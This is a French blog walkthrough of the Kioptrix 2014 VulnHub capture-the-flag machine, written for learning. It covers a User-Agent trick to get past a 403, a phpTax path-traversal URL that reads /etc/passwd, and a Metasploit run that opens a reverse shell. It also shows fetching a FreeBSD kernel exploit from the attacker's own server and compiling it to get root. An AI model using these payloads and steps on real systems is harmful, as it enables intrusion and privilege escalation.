# Solution du CTF Kioptrix 2014 (#5)

Ready
-----

Le [CTF Kyoptrix 2014](http://vulnhub.com/entry/kioptrix_2014-5,62/) est le petit dernier proposé sur *VulnHub*.  

Côté originalité on a droit à un système *FreeBSD* ce qui nous change des habituels systèmes *Linux*.  

L'auteur du challenge prévient que ce CTF est destiné aux débutants, on verra bien ce qu'il en est.  

Parmi les indications données on est averti que la VM (pour VMWare Player) a quelques problèmes de réseau. Il faut aller dans la configuration de la VM pour supprimer le "Network Adapter" puis le recréer avant de lancer la VM (sans doute en raison d'un démon du type udev).  

Steady
------

On commence par l'habituel scan de ports qui nous révèle la présence de deux services accessibles : un serveur web et soit un autre serveur web soit un proxy.  

```plain
Nmap scan report for 192.168.1.53
Host is up (0.00021s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE VERSION
22/tcp   closed ssh
80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
|_http-title: Site doesn't have a title (text/html).
8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
|_http-open-proxy: ERROR: Script execution failed (use -d to debug)
|_http-title: 403 Forbidden
MAC Address: 00:0C:29:AA:34:A3 (VMware)
Device type: VoIP adapter|WAP|firewall|general purpose|storage-misc|broadband router
Running: Cisco embedded, Linux 2.4.X|2.6.X, Netgear RAIDiator 4.X, Sun OpenSolaris, Vonage embedded, Zhone embedded
OS CPE: cpe:/h:cisco:unified_call_manager cpe:/o:linux:linux_kernel:2.4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:2.6.18 cpe:/o:netgear:raidiator:4 cpe:/o:sun:opensolaris cpe:/h:vonage:v-portal cpe:/h:zhone:6211-i3
Too many fingerprints match this host to give specific OS details
```

Sur le port 80 on voit seulement la page par défaut *d'Apache* avec le message "It works". Du moins c'est ce que je pensais car en affichant la source j'aurais remarqué un lien vers un *pChart* [qui est vulnérable](http://www.exploit-db.com/exploits/31173/) à une faille de type divulgation de fichier / remonté d'arborescence .   

Qu'importe puisque j'ai trouvé une autre façon d'arriver à mes fins.  

En supposant que le port 8080 faisait tourner un serveur proxy j'ai lancé un *Medusa* sur ce service qui renvoyait une erreur 403 dans l'idée de trouver des identifiants.  

A ma surprise, le serveur s'est mis à retourner des statuts de réussite (200) à chaque requête.  

Armé de *Wapiti* et de *Wireshark* je me suis rendu compte que le premier ne rencontrait aucune difficulté à faire ses requêtes auprès du serveur. Au contraire, il parvient à explorer les pages d'un site qui nous est inaccessible (erreur 403) quelque soit le navigateur utilisé (*Firefox, Chrome, Opera*...)  

J'ai mis en place *Charles Proxy* pour qu'il réécrive mes requêtes HTTP et les fasse correspondre à ce qu'envoie *Wapiti* en temps normal. Il s'est ainsi avéré que le site sur le port 8080 éjecte les visiteurs qui n'ont un navigateur avec le User-Agent *Mozilla/4.0* (coup de bol c'est celui que j'ai défini dans *Wapiti*).  

![Rewriting user-agent with Charles Proxy](https://raw.githubusercontent.com/devl00p/blog/master/images/charles_ua.png)

Go !
----

Maintenant que l'on a accès au site web, on trouve très aisément une vulnérabilité de divulgation de fichiers dans l'application *phpTax* qui est présente :  

```plain
http://192.168.1.53:8080/phptax/drawimage.php?pfilez=../../../../../../../../../../etc/passwd
```

```plain
root:*:0:0:Charlie &:/root:/bin/csh                                                                                    
toor:*:0:0:Bourne-again Superuser:/root:                                                                               
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin                                                    
operator:*:2:5:System &:/:/usr/sbin/nologin                                                                            
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin                                                             
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin                                                                          
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin                                                                        
games:*:7:13:Games pseudo-user:/usr/games:/usr/sbin/nologin                                                            
news:*:8:8:News Subsystem:/:/usr/sbin/nologin                                                                          
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin                                                            
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin                                                          
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin                                       
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin                                             
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin                                                                          
proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin                                                 
_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin                                                       
_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin                                                               
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico                                     
pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin                                                            
www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin                                                        
hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin                                                     
nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin                                                  
mysql:*:88:88:MySQL Daemon:/var/db/mysql:/usr/sbin/nologin                                                             
ossec:*:1001:1001:User &:/usr/local/ossec-hids:/sbin/nologin                                                           
ossecm:*:1002:1001:User &:/usr/local/ossec-hids:/sbin/nologin                                                          
ossecr:*:1003:1001:User &:/usr/local/ossec-hids:/sbin/nologin
```

Une petite recherche sur le web et on apprend qu'il existe un module *Metasploit* pour une faille d'exécution de code dans ce même logiciel. Il faut juste croiser les doigts pour que *Metasploit* s'identifie avec le bon User-Agent sans quoi on va devoir éditer quelques fichiers.  

```plain
msf exploit(phptax_exec) > show options

Module options (exploit/multi/http/phptax_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        Use a proxy chain
   RHOST      192.168.1.53     yes       The target address
   RPORT      8080             yes       The target port
   TARGETURI  /phptax/         yes       The path to the web application
   VHOST                       no        HTTP server virtual host

Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.3      yes       The listen address
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   PhpTax 0.8

msf exploit(phptax_exec) > exploit

[*] Started reverse handler on 192.168.1.3:4444 
[*] 192.168.1.538080 - Sending request...
[*] 192.168.1.53 - Command shell session 1 closed.  Reason: Died from EOFError
[*] Command shell session 1 opened (127.0.0.1 -> 192.168.1.53:11601) at 2014-04-08 22:24:37 +0200
[*] Command shell session 2 opened (192.168.1.3:4444 -> 192.168.1.53:33921) at 2014-04-08 22:24:38 +0200

id
uid=80(www) gid=80(www) groups=80(www)
```

Bingo !  

En revanche les backdoors MSF pour Linux/BSD ne sont pas terribles : on perd l'environnement à chaque fois (en particulier le répertoire courant) et on ne dispose pas de support du terminal :(   

Qui plus est on est sur un système FreeBSD (*FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE #0*) sur lequel il n'y a ni *curl*, ni *wget*, ni *w3m*, ni *links*... ni *Python* arghh !  

Heureusement il y a une commande baptisée *fetch* qui correspond à un *wget* très basique : sauvés !  

On va pouvoir rapatrier un *tshd* (voir mes précédents articles) et le compiler en mode connect-back (*make freebsd* après édition de *tsh.h*).  

Une fois qu'on a un shell digne de ce nom, il nous reste plus qu'à passer root. On trouve [un exploit pour le kernel 9 sur exploit-db](http://www.exploit-db.com/exploits/26368/) :  

```plain
$ fetch http://192.168.1.3:8000/sploit.c
sploit.c                                      100% of 2215  B   17 MBps
$ gcc -o sploit sploit.c
$ ./sploit
FreeBSD 9.{0,1} mmap/ptrace exploit
by Hunger <fbsd9lul@hunger.hu>
# id
uid=0(root) gid=0(wheel) egid=80(www) groups=80(www)
# ls /root
.cshrc                  .k5login                .mysql_history          congrats.txt            httpd-access.log        monitor.py
.history                .login                  .profile                folderMonitor.log       lazyClearLog.sh         ossec-alerts.log
# cat /root/congrats.txt 
If you are reading this, it means you got root (or cheated).
Congratulations either way...

Hope you enjoyed this new VM of mine. As always, they are made for the beginner in 
mind, and not meant for the seasoned pentester. However this does not mean one 
can't enjoy them.

As with all my VMs, besides getting "root" on the system, the goal is to also
learn the basics skills needed to compromise a system. Most importantly, in my mind,
are information gathering & research. Anyone can throw massive amounts of exploits
and "hope" it works, but think about the traffic.. the logs... Best to take it
slow, and read up on the information you gathered and hopefully craft better
more targetted attacks. 

For example, this system is FreeBSD 9. Hopefully you noticed this rather quickly.
Knowing the OS gives you any idea of what will work and what won't from the get go.
Default file locations are not the same on FreeBSD versus a Linux based distribution.
Apache logs aren't in "/var/log/apache/access.log", but in "/var/log/httpd-access.log".
It's default document root is not "/var/www/" but in "/usr/local/www/apache22/data".
Finding and knowing these little details will greatly help during an attack. Of course
my examples are specific for this target, but the theory applies to all systems.

As a small exercise, look at the logs and see how much noise you generated. Of course
the log results may not be accurate if you created a snapshot and reverted, but at least
it will give you an idea. For fun, I installed "OSSEC-HIDS" and monitored a few things.
Default settings, nothing fancy but it should've logged a few of your attacks. Look
at the following files:
/root/folderMonitor.log
/root/httpd-access.log (softlink)
/root/ossec-alerts.log (softlink)

The folderMonitor.log file is just a cheap script of mine to track created/deleted and modified
files in 2 specific folders. Since FreeBSD doesn't support "iNotify", I couldn't use OSSEC-HIDS 
for this.
The httpd-access.log is rather self-explanatory .
Lastly, the ossec-alerts.log file is OSSEC-HIDS is where it puts alerts when monitoring certain
files. This one should've detected a few of your web attacks.

Feel free to explore the system and other log files to see how noisy, or silent, you were.
And again, thank you for taking the time to download and play.
Sincerely hope you enjoyed yourself.

Be good...

loneferret
http://www.kioptrix.com

p.s.: Keep in mind, for each "web attack" detected by OSSEC-HIDS, by
default it would've blocked your IP (both in hosts.allow & Firewall) for
600 seconds. I was nice enough to remove that part :)
```

Une petite vérification de la configuration *d'Apache* (dans /usr/local/etc/apache22/) pour nos problèmes de 403 confirme les soupçons que l'on avait :  

```plain
SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser

<VirtualHost *:8080>
        DocumentRoot /usr/local/www/apache22/data2

<Directory "/usr/local/www/apache22/data2">
    Options Indexes FollowSymLinks
    AllowOverride All
    Order allow,deny
    Allow from env=Mozilla4_browser
</Directory>

</VirtualHost>
```


*Published April 10 2014 at 11:57*